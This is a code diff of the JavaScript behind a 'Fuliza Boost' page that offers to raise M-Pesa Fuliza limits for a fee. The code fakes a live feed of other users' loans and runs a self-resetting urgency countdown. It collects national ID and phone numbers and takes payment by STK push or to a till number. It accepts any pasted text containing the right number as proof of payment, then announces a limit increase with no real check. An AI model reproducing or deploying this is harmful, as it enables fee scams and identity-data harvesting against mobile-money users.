+  if (feedEntries.length === 0) return;
+  showFeedEntry(0);
+  feedInterval = setInterval(() => {
+    feedIndex = (feedIndex + 1) % feedEntries.length;
+    showFeedEntry(feedIndex);
+  }, 3000);
+}
+
+function showFeedEntry(index) {
+  const entry = feedEntries[index];
+  if (!entry) return;
+  const displayPhone = entry.phone;
+  const displayAmount = entry.amount.toLocaleString();
+  const timeLabel = entry.timeLabel;
+  const hotBadge = entry.isHot ? ' 🔥' : '';
+  feedText.innerHTML =
+    `📱 ${displayPhone} → <span class="highlight">Ksh ${displayAmount}</span>${hotBadge} <span class="time">(${timeLabel})</span>`;
+}
+
+// ─── COUNTDOWN TIMER ──────────────────────────────────────────────
+function startCountdown() {
+  updateCountdownDisplay();
+  countdownInterval = setInterval(() => {
+    countdownSeconds--;
+    if (countdownSeconds <= 0) countdownSeconds = 3 * 3600;
+    updateCountdownDisplay();
+  }, 1000);
+}
+
+function updateCountdownDisplay() {
+  const h = Math.floor(countdownSeconds / 3600);
+  const m = Math.floor((countdownSeconds % 3600) / 60);
+  const s = countdownSeconds % 60;
+  countdownEl.textContent = `${h}h ${String(m).padStart(2, '0')}m ${String(s).padStart(2, '0')}s`;
+}
+
+// ─── HOT DEAL BUTTON ──────────────────────────────────────────────
+function handleHotDealClick() {
+  const hotLoan = loanOptions.find(o => o.amount === HOT_DEAL.amount);
+  if (!hotLoan) return;
+  const boxes = document.querySelectorAll('.loan-box');
+  let targetBox = null;
+  boxes.forEach(box => {
+    if (parseInt(box.dataset.amount) === HOT_DEAL.amount) targetBox = box;
+  });
+  if (targetBox) {
+    document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
+    targetBox.classList.add('selected');
+    selectedLoan = hotLoan;
+    updateButtonState();
+    saveToStorage();
+    document.querySelector('.card').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    setTimeout(() => showIdPhoneModal(), 400);
+  } else {
+    showIdPhoneModal();
+  }
+}
+
+// ─── EVENT LISTENERS ──────────────────────────────────────────────
+function setupEventListeners() {
+  getLimitBtn.addEventListener('click', () => {
+    if (!selectedLoan) return;
+    showIdPhoneModal();
+  });
+  hotDealBtn.addEventListener('click', handleHotDealClick);
+}
+
+// ─── PHONE NORMALIZATION ──────────────────────────────────────────
+function normalizePhoneInput(phone) {
+  let clean = phone.replace(/\D/g, '');
+  if (clean.startsWith('0')) clean = clean.substring(1);
+  if (clean.startsWith('254')) clean = clean.substring(3);
+  if (clean.length !== 9) throw new Error('Invalid phone number length');
+  if (!/^[17]/.test(clean)) throw new Error('Phone must start with 7 or 1');
+  return clean;
+}
+
+function formatPhoneForDisplay(phone) {
+  if (phone.length !== 9) return phone;
+  return phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6);
+}
+
+function formatPhoneForAPI(phone) {
+  return '254' + phone;
+}
+
+async function normalizePhoneNumber(phone) {
+  try {
+    if (API_ENDPOINTS.normalizePhone) {
+      const resp = await fetch(API_ENDPOINTS.normalizePhone, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
+      });
+      if (!resp.ok) throw new Error('Normalization failed');
+      const data = await resp.json();
+      return data.normalized_phone || formatPhoneForAPI(phone);
+    }
+    return formatPhoneForAPI(phone);
+  } catch (e) {
+    return formatPhoneForAPI(phone);
+  }
+}
+
+// ─── ID / PHONE MODAL ─────────────────────────────────────────────
+function showIdPhoneModal() {
+  Swal.fire({
+    title: 'Enter Your Details',
+    html: `
+              <div class="input-container">
+                <div class="input-section-title">
+                  <i class="fas fa-user-check"></i> Provide your details to proceed
+                </div>
+                <div class="input-wrapper">
+                  <label class="input-label"><i class="fas fa-id-card"></i> ID Number</label>
+                  <input type="text" class="input-field" id="swal-id-number" placeholder="Enter your ID number" inputmode="numeric" required>
+                </div>
+                <div class="input-wrapper">
+                  <label class="input-label"><i class="fas fa-mobile-alt"></i> Phone Number</label>
+                  <div class="phone-input-with-prefix">
+                    <div class="phone-prefix">+254</div>
+                    <input type="tel" class="phone-input-field" id="swal-phone" placeholder="712345678" maxlength="10" inputmode="numeric" required>
+                  </div>
+                </div>
+                <div class="input-note-modal">
+                  <i class="fas fa-info-circle"></i> We'll send an M-Pesa STK push to your phone
+                </div>
+              </div>
+            `,
+    icon: 'info',
+    showCancelButton: true,
+    confirmButtonText: 'Continue',
+    cancelButtonText: 'Cancel',
+    focusConfirm: false,
+    allowOutsideClick: false,
+    preConfirm: () => {
+      const idInput = document.getElementById('swal-id-number');
+      const phoneInput = document.getElementById('swal-phone');
+      const idVal = idInput.value.trim();
+      let phoneVal = phoneInput.value;
+      if (!idVal) { Swal.showValidationMessage('Please enter your ID number'); return false; }
+      try { phoneVal = normalizePhoneInput(phoneVal); } catch (e) { Swal.showValidationMessage(e
+          .message); return false; }
+      return { idNumber: idVal, phone: phoneVal };
+    }
+  }).then(result => {
+    if (result.isConfirmed && result.value) {
+      idNumber = result.value.idNumber;
+      phoneNumber = result.value.phone;
+      saveToStorage();
+      initiatePayment();
+    }
+  });
+
+  setTimeout(() => {
+    const idInput = document.getElementById('swal-id-number');
+    const phoneInput = document.getElementById('swal-phone');
+    if (idInput) setTimeout(() => idInput.focus(), 100);
+    const saved = localStorage.getItem('fulizaBoostData');
+    if (saved) {
+      try {
+        const data = JSON.parse(saved);
+        if (data.idNumber) idInput.value = data.idNumber;
+        if (data.phone && data.phone.length === 9) phoneInput.value = data.phone;
+      } catch (e) {}
+    }
+  }, 50);
+}
+
+// ─── STORAGE ──────────────────────────────────────────────────────
+function saveToStorage() {
+  const data = { selectedLoan: selectedLoan, idNumber: idNumber, phone: phoneNumber, timestamp: Date.now() };
+  localStorage.setItem('fulizaBoostData', JSON.stringify(data));
+}
+
+function restoreFromStorage() {
+  const saved = localStorage.getItem('fulizaBoostData');
+  if (!saved) return;
+  try {
+    const data = JSON.parse(saved);
+    if (data.idNumber) idNumber = data.idNumber;
+    if (data.phone && data.phone.length === 9) phoneNumber = data.phone;
+    if (data.selectedLoan) {
+      selectedLoan = data.selectedLoan;
+      const boxes = document.querySelectorAll('.loan-box');
+      boxes.forEach(box => {
+        if (parseInt(box.dataset.amount) === selectedLoan.amount) {
+          box.classList.add('selected');
+          highlightHotDeal();
         }
+      });
+      updateButtonState();
+    }
+  } catch (e) {}
+}
 
-        // ─── STATE ────────────────────────────────────────────────────────
-        let selectedLoan = null;
-        let phoneNumber = '';
-        let idNumber = '';
-        let paymentReference = null;
-        let isProcessing = false;
-        let feedEntries = [];
-        let feedIndex = 0;
-        let feedInterval = null;
-        let countdownInterval = null;
-        let pendingRetryData = null;
+function highlightHotDeal() {
+  if (selectedLoan && selectedLoan.amount === HOT_DEAL.amount) {
+    document.querySelectorAll('.loan-box').forEach(box => {
+      if (parseInt(box.dataset.amount) === HOT_DEAL.amount) {
+        box.classList.add('hot-highlight');
+      }
+    });
+  }
+}
 
-        const loanGrid = document.getElementById('loan-grid');
-        const getLimitBtn = document.getElementById('get-limit-btn');
-        const feedText = document.getElementById('feedText');
-        const countdownEl = document.getElementById('countdownTimer');
-        const hotDealBtn = document.getElementById('hotDealBtn');
-        const hotDealTitle = document.getElementById('hotDealTitle');
-        const hotOriginalPrice = document.getElementById('hotOriginalPrice');
-        const hotDealPrice = document.getElementById('hotDealPrice');
+// ─── PAYMENT HELPERS ──────────────────────────────────────────────
 
-        // ─── TOAST HELPER ──────────────────────────────────────────────────
-        function showToast(message, duration = 2000) {
-            const toast = document.getElementById('toastCopy');
-            toast.textContent = message;
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), duration);
+async function sendPayHeroSTK(phoneNumber, amount, loanAmount, idNumber) {
+  const resp = await fetch(API_ENDPOINTS.initiatePayment, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      phone_number: phoneNumber,
+      amount: amount,
+      loan_amount: loanAmount,
+      id_number: idNumber
+    })
+  });
+  if (!resp.ok) {
+    const err = await resp.json();
+    throw new Error(err.message || 'Payment initiation failed');
+  }
+  return await resp.json();
+}
+
+async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
+  let attempts = 0;
+  return new Promise((resolve, reject) => {
+    const interval = setInterval(async () => {
+      attempts++;
+      try {
+        const resp = await fetch(
+          `${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
+        if (!resp.ok) {
+          if (attempts >= maxAttempts) { clearInterval(interval);
+            reject(new Error('Verification failed')); }
+          return;
         }
-
-        // ─── COUNTDOWN TO MIDNIGHT EAT ──────────────────────────────────
-        // EAT = UTC+3
-        function getSecondsUntilMidnightEAT() {
-            const now = new Date();
-            // Convert to EAT (UTC+3)
-            const eatOffset = 3 * 60; // minutes
-            const localOffset = now.getTimezoneOffset(); // minutes (negative for positive timezones)
-            const diffMinutes = eatOffset + localOffset; // how many minutes to add to get EAT
-            const eatTime = new Date(now.getTime() + diffMinutes * 60000);
-
-            // Midnight EAT today
-            const midnightEAT = new Date(eatTime);
-            midnightEAT.setHours(24, 0, 0, 0);
-
-            // If we're already past midnight, use tomorrow's midnight
-            if (eatTime.getTime() >= midnightEAT.getTime()) {
-                midnightEAT.setDate(midnightEAT.getDate() + 1);
-            }
-
-            const seconds = Math.floor((midnightEAT.getTime() - eatTime.getTime()) / 1000);
-            return Math.max(0, seconds);
+        const data = await resp.json();
+        if (data.success && (data.status === 'COMPLETED' || data.status === 'SUCCESS')) {
+          clearInterval(interval);
+          resolve(true);
+        } else if (data.success && (data.status === 'FAILED' || data.status === 'CANCELLED')) {
+          clearInterval(interval);
+          reject(new Error('Payment failed or cancelled'));
+        } else if (attempts >= maxAttempts) {
+          clearInterval(interval);
+          reject(new Error('Verification timeout'));
         }
+      } catch (e) {
+        if (attempts >= maxAttempts) { clearInterval(interval);
+          reject(new Error('Verification failed')); }
+      }
+    }, intervalMs);
+  });
+}
 
-        function formatCountdown(seconds) {
-            const h = Math.floor(seconds / 3600);
-            const m = Math.floor((seconds % 3600) / 60);
-            const s = seconds % 60;
-            return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
-        }
+// ─── EXTRACT AMOUNT FROM M-PESA MESSAGE ──────────────────────────
+function extractAmountFromMpesaMessage(msg) {
+  const match = msg.match(/(\d+(?:\.\d{1,2})?)/);
+  if (!match) return null;
+  const amt = parseFloat(match[1]);
+  return isNaN(amt) ? null : amt;
+}
 
-        function updateCountdownDisplay() {
-            const seconds = getSecondsUntilMidnightEAT();
-            countdownEl.textContent = formatCountdown(seconds);
-        }
+// ─── MANUAL PAYMENT FALLBACK ──────────────────────────────────────
+function showManualPaymentFallback(rawPhone, retryFn) {
+  pendingRetryData = { rawPhone, retryFn };
 
-        function startCountdown() {
-            updateCountdownDisplay();
-            if (countdownInterval) clearInterval(countdownInterval);
-            countdownInterval = setInterval(updateCountdownDisplay, 1000);
-        }
+  // Show loading modal with ONLY the spinner (no text)
+  Swal.fire({
+    html: '<div style="display:flex;justify-content:center;align-items:center;height:80px;"><i class="fas fa-spinner fa-pulse" style="font-size:2.5rem;color:var(--primary);"></i></div>',
+    showConfirmButton: false,
+    allowOutsideClick: false,
+    didOpen: () => Swal.showLoading()
+  });
 
-        // ─── UPDATE HOT DEAL BANNER FROM CONFIG ──────────────────────────
-        function updateHotDealBanner() {
-            hotDealTitle.textContent = `Ksh ${HOT_DEAL.amount.toLocaleString()} Limit`;
-            hotOriginalPrice.textContent = `Ksh ${HOT_DEAL.originalFee.toLocaleString()}`;
-            hotDealPrice.textContent = `Ksh ${HOT_DEAL.fee.toLocaleString()}`;
-        }
+  // After 2 seconds, close and show manual modal
+  setTimeout(() => {
+    Swal.close();
 
-        // ─── INIT ──────────────────────────────────────────────────────────
-        function init() {
-            updateHotDealBanner();
-            feedEntries = generateFeedEntries();
-            renderLoanOptions();
-            startFeed();
-            startCountdown();
-            setupEventListeners();
-            restoreFromStorage();
-            updateButtonState();
-            highlightHotDeal();
-        }
+    // Build the manual modal with clear instructions and amount
+    const feeAmount = selectedLoan ? selectedLoan.fee : 0;
+    Swal.fire({
+      title: 'Complete Payment Manually',
+      html: `
+                <div style="text-align:left;padding:0 4px;">
+                  <div class="manual-payment-box">
+                    <i class="fas fa-info-circle"></i> <strong>STK Push failed</strong>
+                    <p style="font-size:0.85rem;margin-top:4px;">Don't worry – you can pay manually.</p>
+                  </div>
 
-        // ─── RENDER LOAN GRID ─────────────────────────────────────────────
-        function renderLoanOptions() {
-            loanGrid.innerHTML = '';
-            loanOptions.forEach((loan, index) => {
-                const loanBox = document.createElement('div');
-                loanBox.className = 'loan-box';
-                if (loan.isHot) loanBox.classList.add('hot-highlight');
-                loanBox.dataset.index = index;
-                loanBox.dataset.amount = loan.amount;
-                loanBox.dataset.fee = loan.fee;
+                  <p style="font-weight:600;font-size:0.85rem;margin-top:8px;">Follow these steps:</p>
+                  <ol style="font-size:0.85rem;color:var(--text-dark);padding-left:20px;margin:8px 0;">
+                    <li>Open M-Pesa <strong>Lipa Na M-Pesa</strong> → <strong>Buy Goods</strong></li>
+                    <li>Enter Till Number: <strong style="color:var(--primary);">${TILL_NUMBER}</strong></li>
+                    <li>Enter Amount: <strong style="color:var(--accent);">Ksh ${feeAmount}</strong></li>
+                    <li>Enter your PIN and complete payment</li>
+                    <li>Paste the confirmation message below</li>
+                  </ol>
 
-                const hotTag = loan.isHot ? '<span class="hot-tag">🔥 Deal</span>' : '';
-                let feeHtml = '';
-                if (loan.isHot) {
-                    feeHtml =
-                        `<div class="fee"><span class="original-fee">Ksh ${loan.originalFee}</span> <span class="deal-fee">Ksh ${loan.fee}</span></div>`;
-                } else {
-                    feeHtml = `<div class="fee">Fee: Ksh ${loan.fee}</div>`;
-                }
+                  <div class="copy-till" style="justify-content:center;">
+                    <span class="till-number">${TILL_NUMBER}</span>
+                    <button class="copy-btn-sm" id="copyTillManualBtn"><i class="fas fa-copy"></i> Copy</button>
+                  </div>
 
-                loanBox.innerHTML = `
-                        ${hotTag}
-                        <div class="amount">Ksh ${loan.amount.toLocaleString()}</div>
-                        ${feeHtml}
-                        <button class="get-btn-inline">Get Now</button>
-                    `;
+                  <div class="manual-input-group">
+                    <label><i class="fas fa-paste"></i> Paste your M-Pesa confirmation message</label>
+                    <textarea id="manualTxInput" placeholder="Paste the full message here..." rows="3"></textarea>
+                    <div class="error-msg" id="manualErrorMsg">Invalid amount or message. Please check and try again.</div>
+                  </div>
 
-                loanBox.addEventListener('click', () => selectLoan(loanBox, loan));
-                const btn = loanBox.querySelector('.get-btn-inline');
-                btn.addEventListener('click', function(e) {
-                    e.stopPropagation();
-                    if (selectedLoan && selectedLoan.amount === loan.amount) {
-                        showIdPhoneModal();
-                    }
-                });
-                loanGrid.appendChild(loanBox);
-            });
-        }
-
-        // ─── SELECT LOAN ──────────────────────────────────────────────────
-        function selectLoan(loanBox, loan) {
-            document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
-            loanBox.classList.add('selected');
-            selectedLoan = loan;
-            updateButtonState();
-            saveToStorage();
-            loanBox.classList.add('pulse');
-            setTimeout(() => loanBox.classList.remove('pulse'), 2000);
-        }
-
-        // ─── UPDATE BUTTON ────────────────────────────────────────────────
-        function updateButtonState() {
-            const valid = selectedLoan !== null;
-            getLimitBtn.classList.toggle('disabled', !valid);
-            getLimitBtn.disabled = !valid;
-            if (valid) {
-                getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Ksh ${selectedLoan.amount.toLocaleString()} Now`;
-            } else {
-                getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Limit Now`;
-            }
-        }
-
-        // ─── FEED ROTATION ─────────────────────────────────────────────────
-        function startFeed() {
-            if (feedEntries.length === 0) return;
-            showFeedEntry(0);
-            feedInterval = setInterval(() => {
-                feedIndex = (feedIndex + 1) % feedEntries.length;
-                showFeedEntry(feedIndex);
-            }, 3000);
-        }
-
-        function showFeedEntry(index) {
-            const entry = feedEntries[index];
-            if (!entry) return;
-            const displayPhone = entry.phone;
-            const displayAmount = entry.amount.toLocaleString();
-            const timeLabel = entry.timeLabel;
-            const hotBadge = entry.isHot ? ' 🔥' : '';
-            feedText.innerHTML =
-                `📱 ${displayPhone} → <span class="highlight">Ksh ${displayAmount}</span>${hotBadge} <span class="time">(${timeLabel})</span>`;
-        }
-
-        // ─── HOT DEAL BUTTON ──────────────────────────────────────────────
-        function handleHotDealClick() {
-            const hotLoan = loanOptions.find(o => o.amount === HOT_DEAL.amount);
-            if (!hotLoan) {
-                // Fallback: try to find the one with isHot: true
-                const fallback = loanOptions.find(o => o.isHot === true);
-                if (fallback) {
-                    // Update HOT_DEAL to match (shouldn't happen if config is correct)
-                    console.warn('Hot deal mismatch — using fallback');
-                    selectHotDeal(fallback);
-                    return;
-                }
-                console.error('Hot deal not found in loanOptions');
-                return;
-            }
-            selectHotDeal(hotLoan);
-        }
-
-        function selectHotDeal(loan) {
-            const boxes = document.querySelectorAll('.loan-box');
-            let targetBox = null;
-            boxes.forEach(box => {
-                if (parseInt(box.dataset.amount) === loan.amount) targetBox = box;
-            });
-            if (targetBox) {
-                document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
-                targetBox.classList.add('selected');
-                selectedLoan = loan;
-                updateButtonState();
-                saveToStorage();
-                document.querySelector('.card').scrollIntoView({ behavior: 'smooth', block: 'center' });
-                setTimeout(() => showIdPhoneModal(), 400);
-            } else {
-                // If not found, render again and try
-                renderLoanOptions();
-                const newBoxes = document.querySelectorAll('.loan-box');
-                newBoxes.forEach(box => {
-                    if (parseInt(box.dataset.amount) === loan.amount) {
-                        box.click();
-                        document.querySelector('.card').scrollIntoView({ behavior: 'smooth', block: 'center' });
-                        setTimeout(() => showIdPhoneModal(), 400);
-                    }
-                });
-            }
-        }
-
-        // ─── HIGHLIGHT HOT DEAL ───────────────────────────────────────────
-        function highlightHotDeal() {
-            if (selectedLoan && selectedLoan.amount === HOT_DEAL.amount) {
-                document.querySelectorAll('.loan-box').forEach(box => {
-                    if (parseInt(box.dataset.amount) === HOT_DEAL.amount) {
-                        box.classList.add('hot-highlight');
-                    }
-                });
-            }
-        }
-
-        // ─── EVENT LISTENERS ──────────────────────────────────────────────
-        function setupEventListeners() {
-            getLimitBtn.addEventListener('click', () => {
-                if (!selectedLoan) return;
-                showIdPhoneModal();
-            });
-            hotDealBtn.addEventListener('click', handleHotDealClick);
-        }
-
-        // ─── PHONE NORMALIZATION ──────────────────────────────────────────
-        function normalizePhoneInput(phone) {
-            let clean = phone.replace(/\D/g, '');
-            if (clean.startsWith('0')) clean = clean.substring(1);
-            if (clean.startsWith('254')) clean = clean.substring(3);
-            if (clean.length !== 9) throw new Error('Invalid phone number length');
-            if (!/^[17]/.test(clean)) throw new Error('Phone must start with 7 or 1');
-            return clean;
-        }
-
-        function formatPhoneForDisplay(phone) {
-            if (phone.length !== 9) return phone;
-            return phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6);
-        }
-
-        function formatPhoneForAPI(phone) {
-            return '254' + phone;
-        }
-
-        async function normalizePhoneNumber(phone) {
-            try {
-                if (API_ENDPOINTS.normalizePhone) {
-                    const resp = await fetch(API_ENDPOINTS.normalizePhone, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
-                    });
-                    if (!resp.ok) throw new Error('Normalization failed');
-                    const data = await resp.json();
-                    return data.normalized_phone || formatPhoneForAPI(phone);
-                }
-                return formatPhoneForAPI(phone);
-            } catch (e) {
-                return formatPhoneForAPI(phone);
-            }
-        }
-
-        // ─── ID / PHONE MODAL ─────────────────────────────────────────────
-        function showIdPhoneModal() {
-            Swal.fire({
-                title: 'Enter Your Details',
-                html: `
-                        <div class="input-container">
-                            <div class="input-section-title">
-                                <i class="fas fa-user-check"></i> Provide your details to proceed
-                            </div>
-                            <div class="input-wrapper">
-                                <label class="input-label"><i class="fas fa-id-card"></i> ID Number</label>
-                                <input type="text" class="input-field" id="swal-id-number" placeholder="Enter your ID number" inputmode="numeric" required>
-                            </div>
-                            <div class="input-wrapper">
-                                <label class="input-label"><i class="fas fa-mobile-alt"></i> Phone Number</label>
-                                <div class="phone-input-with-prefix">
-                                    <div class="phone-prefix">+254</div>
-                                    <input type="tel" class="phone-input-field" id="swal-phone" placeholder="712345678" maxlength="10" inputmode="numeric" required>
-                                </div>
-                            </div>
-                            <div class="input-note-modal">
-                                <i class="fas fa-info-circle"></i> We'll send an M-Pesa STK push to your phone
-                            </div>
-                        </div>
-                    `,
-                icon: 'info',
-                showCancelButton: true,
-                confirmButtonText: 'Continue',
-                cancelButtonText: 'Cancel',
-                focusConfirm: false,
-                allowOutsideClick: false,
-                preConfirm: () => {
-                    const idInput = document.getElementById('swal-id-number');
-                    const phoneInput = document.getElementById('swal-phone');
-                    const idVal = idInput.value.trim();
-                    let phoneVal = phoneInput.value;
-                    if (!idVal) { Swal.showValidationMessage('Please enter your ID number'); return false; }
-                    try { phoneVal = normalizePhoneInput(phoneVal); } catch (e) { Swal.showValidationMessage(e
-                            .message); return false; }
-                    return { idNumber: idVal, phone: phoneVal };
-                }
-            }).then(result => {
-                if (result.isConfirmed && result.value) {
-                    idNumber = result.value.idNumber;
-                    phoneNumber = result.value.phone;
-                    saveToStorage();
-                    initiatePayment();
-                }
-            });
-
-            setTimeout(() => {
-                const idInput = document.getElementById('swal-id-number');
-                const phoneInput = document.getElementById('swal-phone');
-                if (idInput) setTimeout(() => idInput.focus(), 100);
-                const saved = localStorage.getItem('fulizaBoostData');
-                if (saved) {
-                    try {
-                        const data = JSON.parse(saved);
-                        if (data.idNumber) idInput.value = data.idNumber;
-                        if (data.phone && data.phone.length === 9) phoneInput.value = data.phone;
-                    } catch (e) {}
-                }
-            }, 50);
-        }
-
-        // ─── STORAGE ──────────────────────────────────────────────────────
-        function saveToStorage() {
-            const data = { selectedLoan: selectedLoan, idNumber: idNumber, phone: phoneNumber, timestamp: Date.now() };
-            localStorage.setItem('fulizaBoostData', JSON.stringify(data));
-        }
-
-        function restoreFromStorage() {
-            const saved = localStorage.getItem('fulizaBoostData');
-            if (!saved) return;
-            try {
-                const data = JSON.parse(saved);
-                if (data.idNumber) idNumber = data.idNumber;
-                if (data.phone && data.phone.length === 9) phoneNumber = data.phone;
-                if (data.selectedLoan) {
-                    selectedLoan = data.selectedLoan;
-                    const boxes = document.querySelectorAll('.loan-box');
-                    boxes.forEach(box => {
-                        if (parseInt(box.dataset.amount) === selectedLoan.amount) {
-                            box.classList.add('selected');
-                            highlightHotDeal();
-                        }
-                    });
-                    updateButtonState();
-                }
-            } catch (e) {}
-        }
-
-        // ─── PAYMENT HELPERS ──────────────────────────────────────────────
-
-        async function sendPayHeroSTK(phoneNumber, amount, loanAmount, idNumber) {
-            const resp = await fetch(API_ENDPOINTS.initiatePayment, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone_number: phoneNumber,
-                    amount: amount,
-                    loan_amount: loanAmount,
-                    id_number: idNumber
-                })
-            });
-            if (!resp.ok) {
-                const err = await resp.json();
-                throw new Error(err.message || 'Payment initiation failed');
-            }
-            return await resp.json();
-        }
-
-        async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
-            let attempts = 0;
-            return new Promise((resolve, reject) => {
-                const interval = setInterval(async () => {
-                    attempts++;
-                    try {
-                        const resp = await fetch(
-                            `${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
-                        if (!resp.ok) {
-                            if (attempts >= maxAttempts) { clearInterval(interval);
-                                reject(new Error('Verification failed')); }
-                            return;
-                        }
-                        const data = await resp.json();
-                        if (data.success && (data.status === 'COMPLETED' || data.status === 'SUCCESS')) {
-                            clearInterval(interval);
-                            resolve(true);
-                        } else if (data.success && (data.status === 'FAILED' || data.status === 'CANCELLED')) {
-                            clearInterval(interval);
-                            reject(new Error('Payment failed or cancelled'));
-                        } else if (attempts >= maxAttempts) {
-                            clearInterval(interval);
-                            reject(new Error('Verification timeout'));
-                        }
-                    } catch (e) {
-                        if (attempts >= maxAttempts) { clearInterval(interval);
-                            reject(new Error('Verification failed')); }
-                    }
-                }, intervalMs);
-            });
-        }
-
-        // ─── EXTRACT AMOUNT FROM M-PESA MESSAGE ──────────────────────────
-        function extractAmountFromMpesaMessage(msg) {
-            const match = msg.match(/(\d+(?:\.\d{1,2})?)/);
-            if (!match) return null;
-            const amt = parseFloat(match[1]);
-            return isNaN(amt) ? null : amt;
-        }
-
-        // ─── MANUAL PAYMENT FALLBACK ──────────────────────────────────────
-        function showManualPaymentFallback(rawPhone, retryFn) {
-            pendingRetryData = { rawPhone, retryFn };
-
-            Swal.fire({
-                html: '<div style="display:flex;justify-content:center;align-items:center;height:80px;"><i class="fas fa-spinner fa-pulse" style="font-size:2.5rem;color:var(--primary);"></i></div>',
-                showConfirmButton: false,
-                allowOutsideClick: false,
-                didOpen: () => Swal.showLoading()
-            });
-
-            setTimeout(() => {
-                Swal.close();
-
-                const feeAmount = selectedLoan ? selectedLoan.fee : 0;
-                Swal.fire({
-                    title: 'Complete Payment Manually',
-                    html: `
-                            <div style="text-align:left;padding:0 4px;">
-                                <div class="manual-payment-box">
-                                    <i class="fas fa-info-circle"></i> <strong>STK Push failed</strong>
-                                    <p style="font-size:0.85rem;margin-top:4px;">Don't worry – you can pay manually.</p>
-                                </div>
-
-                                <p style="font-weight:600;font-size:0.85rem;margin-top:8px;">Follow these steps:</p>
-                                <ol style="font-size:0.85rem;color:var(--text-dark);padding-left:20px;margin:8px 0;">
-                                    <li>Open M-Pesa <strong>Lipa Na M-Pesa</strong> → <strong>Buy Goods</strong></li>
-                                    <li>Enter Till Number: <strong style="color:var(--primary);">${TILL_NUMBER}</strong></li>
-                                    <li>Enter Amount: <strong style="color:var(--accent);">Ksh ${feeAmount}</strong></li>
-                                    <li>Enter your PIN and complete payment</li>
-                                    <li>Paste the confirmation message below</li>
-                                </ol>
-
-                                <div class="copy-till" style="justify-content:center;">
-                                    <span class="till-number">${TILL_NUMBER}</span>
-                                    <button class="copy-btn-sm" id="copyTillManualBtn"><i class="fas fa-copy"></i> Copy</button>
-                                </div>
-
-                                <div class="manual-input-group">
-                                    <label><i class="fas fa-paste"></i> Paste your M-Pesa confirmation message</label>
-                                    <textarea id="manualTxInput" placeholder="Paste the full message here..." rows="3"></textarea>
-                                    <div class="error-msg" id="manualErrorMsg">Invalid amount or message. Please check and try again.</div>
-                                </div>
-
-                                <div class="manual-actions">
-                                    <button class="btn-primary" id="submitManualPaymentBtn">
-                                        <i class="fas fa-check"></i> I have paid
-                                    </button>
-                                    <button class="btn-secondary" id="cancelManualBtn">
-                                        <i class="fas fa-times"></i> Cancel
-                                    </button>
-                                </div>
-                            </div>
-                        `,
-                    icon: false,
-                    showConfirmButton: false,
-                    allowOutsideClick: false,
-                    didOpen: () => {
-                        document.getElementById('copyTillManualBtn').addEventListener('click', () => {
-                            navigator.clipboard.writeText(TILL_NUMBER);
-                            showToast('Till number copied!');
-                        });
-
-                        document.getElementById('submitManualPaymentBtn').addEventListener('click', () => {
-                            const rawMsg = document.getElementById('manualTxInput').value.trim();
-                            const textarea = document.getElementById('manualTxInput');
-                            const errorMsg = document.getElementById('manualErrorMsg');
-
-                            textarea.classList.remove('error');
-                            errorMsg.classList.remove('show');
-
-                            if (!rawMsg) {
-                                textarea.classList.add('error');
-                                errorMsg.textContent = 'Please paste your M-Pesa confirmation message.';
-                                errorMsg.classList.add('show');
-                                textarea.focus();
-                                return;
-                            }
-                            const extracted = extractAmountFromMpesaMessage(rawMsg);
-                            if (extracted === null) {
-                                textarea.classList.add('error');
-                                errorMsg.textContent = 'Please paste the correct Mpesa message';
-                                errorMsg.classList.add('show');
-                                textarea.value = '';
-                                textarea.focus();
-                                return;
-                            }
-                            const expected = selectedLoan ? selectedLoan.fee : 0;
-                            if (Math.abs(extracted - expected) < 0.01) {
-                                Swal.close();
-                                completeManualPayment(rawPhone, rawMsg, extracted);
-                            } else {
-                                textarea.classList.add('error');
-                                errorMsg.textContent = 'Invalid message. Please check and try again.';
-                                errorMsg.classList.add('show');
-                                textarea.value = '';
-                                textarea.focus();
-                            }
-                        });
-
-                        document.getElementById('cancelManualBtn').addEventListener('click', () => {
-                            Swal.close();
-                            window.location.reload();
-                        });
-                    }
-                });
-            }, 2000);
-        }
-
-        // ─── COMPLETE MANUAL PAYMENT ──────────────────────────────────────
-        function completeManualPayment(phone, rawMessage, extractedAmount) {
-            Swal.fire({
-                title: 'Processing Payment',
-                html: 'Verifying your manual payment...',
-                allowOutsideClick: false,
-                didOpen: () => Swal.showLoading()
-            });
-
-            setTimeout(() => {
-                Swal.close();
-                Swal.fire({
-                    title: 'Payment Successful!',
-                    html: `
-                            <div style="text-align:center;padding:0 4px;">
-                                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                                <p><strong>Your Fuliza limit has been increased!</strong></p>
-                                <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong></p>
-                                <div style="background:linear-gradient(135deg,rgba(31,122,31,0.1),rgba(31,122,31,0.05));border-left:3px solid var(--accent);padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:var(--text-dark);line-height:1.4;">
-                                    <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
-                                        <i class="fas fa-exclamation-circle" style="color:var(--accent);font-size:0.8rem;"></i>
-                                        <strong style="color:var(--accent);">Important:</strong>
-                                    </div>
-                                    <div style="padding-left:20px;">
